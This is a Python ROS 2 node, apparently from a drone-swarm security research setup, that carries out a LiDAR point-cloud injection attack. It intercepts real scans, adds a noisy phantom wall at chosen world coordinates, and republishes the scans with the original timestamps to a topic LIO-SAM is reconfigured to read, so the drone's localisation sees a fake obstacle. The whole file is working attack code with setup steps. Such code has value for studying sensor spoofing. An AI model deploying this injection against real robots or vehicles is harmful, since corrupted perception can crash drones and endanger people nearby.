#!/usr/bin/env python3
"""
Layer 2 Attack: Point Cloud Injection — Phantom Wall (Man-in-the-Middle)

Sits between the LiDAR bridge and LIO-SAM. Subscribes to the real LiDAR
scans, appends phantom wall points to each scan, and republishes on a
different topic that LIO-SAM reads from. Every scan LIO-SAM processes
now contains the fake wall baked in.

Setup:
  1. Change LIO-SAM params_drone1.yaml:
       pointCloudTopic: "/drone1/lidar/points_attack"
  2. Rebuild LIO-SAM
  3. Run this node — it reads /drone1/lidar/points (real)
     and publishes to /drone1/lidar/points_attack (modified)

Usage:
  ros2 run swarm_mission pointcloud_injector --ros-args \
    -p target_drone:=drone1 \
    -p wall_x:=-10.0 \
    -p spawn_x:=-6.0 -p spawn_y:=0.0
"""
import numpy as np

import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy, DurabilityPolicy
from sensor_msgs.msg import PointCloud2, PointField
from geometry_msgs.msg import PoseStamped


class PointCloudInjector(Node):
    def __init__(self):
        super().__init__('pointcloud_injector')

        # ---- Parameters ----
        self.declare_parameter('target_drone', 'drone1')
        self.declare_parameter('wall_x', -10.0)
        self.declare_parameter('wall_y_min', -5.0)
        self.declare_parameter('wall_y_max', 3.0)
        self.declare_parameter('wall_z_min', 0.0)
        self.declare_parameter('wall_z_max', 3.5)
        self.declare_parameter('wall_thickness', 0.10)
        self.declare_parameter('point_spacing', 0.15)
        self.declare_parameter('spawn_x', -6.0)
        self.declare_parameter('spawn_y', 0.0)
        self.declare_parameter('noise_sigma', 0.02)
        self.declare_parameter('intensity', 80.0)

        self.target_drone = self.get_parameter('target_drone').value
        self.wall_x = self.get_parameter('wall_x').value
        self.wall_y_min = self.get_parameter('wall_y_min').value
        self.wall_y_max = self.get_parameter('wall_y_max').value
        self.wall_z_min = self.get_parameter('wall_z_min').value
        self.wall_z_max = self.get_parameter('wall_z_max').value
        self.wall_thickness = self.get_parameter('wall_thickness').value
        self.point_spacing = self.get_parameter('point_spacing').value
        self.spawn_x = self.get_parameter('spawn_x').value
        self.spawn_y = self.get_parameter('spawn_y').value
        self.noise_sigma = self.get_parameter('noise_sigma').value
        self.intensity = self.get_parameter('intensity').value

        # ---- Topics ----
        # Real LiDAR from bridge (input)
        real_topic = f'/{self.target_drone}/lidar/points'
        # Modified topic for LIO-SAM (output)
        attack_topic = f'/{self.target_drone}/lidar/points_attack'
        # Drone pose
        if self.target_drone == 'drone1':
            pose_topic = '/mavros/local_position/pose'
        else:
            pose_topic = f'/{self.target_drone}/mavros/local_position/pose'

        self.lidar_frame = f'{self.target_drone}/lidar_link'

        # ---- Pre-compute wall grid in world coords ----
        self._build_wall_grid_world()

        # ---- State ----
        self.drone_local_pose = None
        self.injection_count = 0
        self.passthrough_count = 0

        # ---- QoS ----
        qos_reliable = QoSProfile(
            reliability=ReliabilityPolicy.RELIABLE,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5)

        qos_besteffort = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            depth=10)

        # ---- Publisher: modified scans to LIO-SAM ----
        self.pc_pub = self.create_publisher(
            PointCloud2, attack_topic, qos_reliable)

        # ---- Subscribers ----
        # Real LiDAR scans
        self.lidar_sub = self.create_subscription(
            PointCloud2, real_topic, self.lidar_callback, qos_besteffort)

        # Drone pose for coordinate transform
        self.pose_sub = self.create_subscription(
            PoseStamped, pose_topic, self.pose_callback, qos_besteffort)

        self.get_logger().info(
            f'Point Cloud Injector (MITM mode) started\n'
            f'  Input:  {real_topic} (real LiDAR)\n'
            f'  Output: {attack_topic} (modified for LIO-SAM)\n'
            f'  Pose:   {pose_topic}\n'
            f'  Wall at world x={self.wall_x:.1f}, '
            f'y=[{self.wall_y_min:.1f}, {self.wall_y_max:.1f}], '
            f'z=[{self.wall_z_min:.1f}, {self.wall_z_max:.1f}]\n'
            f'  {self.n_wall_points} wall points appended per scan')

    def _build_wall_grid_world(self):
        ys = np.arange(self.wall_y_min, self.wall_y_max, self.point_spacing)
        zs = np.arange(self.wall_z_min, self.wall_z_max, self.point_spacing)
        yy, zz = np.meshgrid(ys, zs)
        self.wall_world = np.column_stack([
            np.full(yy.size, self.wall_x),
            yy.flatten(),
            zz.flatten()])
        self.n_wall_points = yy.size
        self.get_logger().info(
            f'Wall grid: {self.n_wall_points} points ({len(ys)} x {len(zs)})')

    def pose_callback(self, msg: PoseStamped):
        self.drone_local_pose = msg.pose

    def lidar_callback(self, msg: PointCloud2):
        """
        For each real LiDAR scan:
        1. Parse the original points
        2. Generate wall points in sensor frame
        3. Merge them into a single PointCloud2
        4. Publish on the attack topic with the original timestamp
        """
        if self.drone_local_pose is None:
            # No pose yet — pass through unmodified so LIO-SAM can initialize
            self.pc_pub.publish(msg)
            self.passthrough_count += 1
            if self.passthrough_count % 10 == 1:
                self.get_logger().info(
                    f'Passthrough #{self.passthrough_count} (waiting for pose)')
            return

        # ---- Parse original scan ----
        original_points = self._parse_pointcloud2(msg)
        n_original = len(original_points)

        # ---- Generate wall points in sensor-relative frame ----
        lx = self.drone_local_pose.position.x
        ly = self.drone_local_pose.position.y
        lz = self.drone_local_pose.position.z

        drone_world_x = lx + self.spawn_x
        drone_world_y = ly + self.spawn_y
        drone_world_z = lz

        rel_x = self.wall_world[:, 0] - drone_world_x
        rel_y = self.wall_world[:, 1] - drone_world_y
        rel_z = self.wall_world[:, 2] - drone_world_z

        # Distance filter
        dist = np.sqrt(rel_x**2 + rel_y**2 + rel_z**2)
        mask = (dist > 0.5) & (dist < 80.0)

        if mask.sum() == 0:
            # Wall out of range — pass through unmodified
            self.pc_pub.publish(msg)
            return

        wall_x = rel_x[mask].copy()
        wall_y = rel_y[mask].copy()
        wall_z = rel_z[mask].copy()
        n_wall = len(wall_x)

        # Add noise
        if self.noise_sigma > 0:
            wall_x += np.random.normal(0, self.noise_sigma, n_wall)
            wall_y += np.random.normal(0, self.noise_sigma, n_wall)
            wall_z += np.random.normal(0, self.noise_sigma, n_wall)
        if self.wall_thickness > 0:
            wall_x += np.random.uniform(
                -self.wall_thickness / 2, self.wall_thickness / 2, n_wall)

        # ---- Merge original + wall points ----
        # Use the original scan's point format (point_step, fields)
        # Create wall point data matching the original format
        wall_data = self._pack_wall_points(
            wall_x, wall_y, wall_z, msg.point_step, msg.fields)

        # Concatenate original data + wall data
        merged_data = bytes(msg.data) + wall_data
        n_total = n_original + n_wall

        # ---- Build merged message ----
        out = PointCloud2()
        out.header = msg.header                 # keep original timestamp + frame
        out.height = 1
        out.width = n_total
        out.fields = msg.fields                 # keep original field layout
        out.is_bigendian = msg.is_bigendian
        out.point_step = msg.point_step
        out.row_step = msg.point_step * n_total
        out.data = merged_data
        out.is_dense = True

        self.pc_pub.publish(out)
        self.injection_count += 1

        if self.injection_count % 10 == 1:
            self.get_logger().info(
                f'Scan #{self.injection_count}: {n_original} real + '
                f'{n_wall} wall = {n_total} total, '
                f'drone local ({lx:.1f},{ly:.1f},{lz:.1f}), '
                f'wall dist {abs(self.wall_x - drone_world_x):.1f}m')

    def _parse_pointcloud2(self, msg: PointCloud2):
        """Parse PointCloud2 into numpy array. Returns point count."""
        n = msg.width * msg.height
        return np.frombuffer(msg.data, dtype=np.uint8).reshape(n, msg.point_step) if n > 0 else np.array([])

    def _pack_wall_points(self, x, y, z, point_step, fields):
        """
        Pack wall points into bytes matching the original scan's field layout.
        Handles variable point_step with padding/extra fields.
        """
        n = len(x)
        buf = bytearray(n * point_step)

        # Find field offsets
        field_map = {f.name: f.offset for f in fields}
        x_off = field_map.get('x', 0)
        y_off = field_map.get('y', 4)
        z_off = field_map.get('z', 8)
        int_off = field_map.get('intensity', None)
        ring_off = field_map.get('ring', None)

        for i in range(n):
            base = i * point_step
            # x, y, z as float32
            buf[base + x_off:base + x_off + 4] = np.float32(x[i]).tobytes()
            buf[base + y_off:base + y_off + 4] = np.float32(y[i]).tobytes()
            buf[base + z_off:base + z_off + 4] = np.float32(z[i]).tobytes()
            # intensity
            if int_off is not None:
                buf[base + int_off:base + int_off + 4] = np.float32(
                    self.intensity).tobytes()
            # ring (uint16) — set to 8 (middle ring of VLP-16)
            if ring_off is not None:
                buf[base + ring_off:base + ring_off + 2] = np.uint16(8).tobytes()

        return bytes(buf)


def main(args=None):
    rclpy.init(args=args)
    node = PointCloudInjector()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        node.get_logger().info(
            f'Shutting down — {node.injection_count} scans modified')
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
